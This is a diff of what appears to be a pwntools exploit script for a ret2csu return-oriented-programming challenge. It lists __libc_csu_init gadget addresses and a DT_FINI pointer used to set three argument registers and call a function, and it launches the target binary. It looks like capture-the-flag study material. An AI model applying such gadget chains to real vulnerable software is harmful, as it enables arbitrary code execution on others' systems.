@@ -15,7 +15,7 @@ RDI = 0xdeadbeefdeadbeef
 RSI = 0xcafebabecafebabe
 RDX = 0xd00df00dd00df00d
 
----------- GADGETS ----------
+---------- csu_pop GADGET ----------
 0x40069A   pop rbx
 0x40069B   pop rbp
 0x40069C   pop r12
@@ -25,21 +25,19 @@ RDX = 0xd00df00dd00df00d
 0x4006A4   retn
 
 
+---------- csu_call GADGET ----------
 0x400680   mov rdx, r15
 0x400683   mov rsi, r14
 0x400686   mov edi, r13d
 0x400689   call QWORD PTR [r12 + rbx*8]
-"""
 
-csu_pop   = p64(0x40069A)
-csu_call  = p64(0x400680)
-pop_rdi   = p64(0x4006a3) # pop rdi ; ret
-"""
+
 ---------- Elf64_Dyn STRUCTURE -----------
 00000000  Elf64_Dyn struc ; (sizeof=0x10, align=0x8, copyof_3)
 00000000  d_tag   dq ?
 00000008  d_un    dq ?
 00000010  Elf64_Dyn ends
+
 
 ---------- Elf64_Dyn GADGET ----------
 0x600E40   Elf64_Dyn <0Dh, 4006B4h>  ; DT_FINI
@@ -47,7 +45,11 @@ pop_rdi   = p64(0x4006a3) # pop rdi ; ret
 --> 0x4006B8   add rsp, 8
 --> 0x4006BC   retn
 """
-dt_fini = p64(0x600E48)
+
+csu_pop   = p64(0x40069A)
+csu_call  = p64(0x400680)
+pop_rdi   = p64(0x4006a3) # pop rdi ; ret
+dt_fini   = p64(0x600E48)
 
 p = process(BINARY)
 
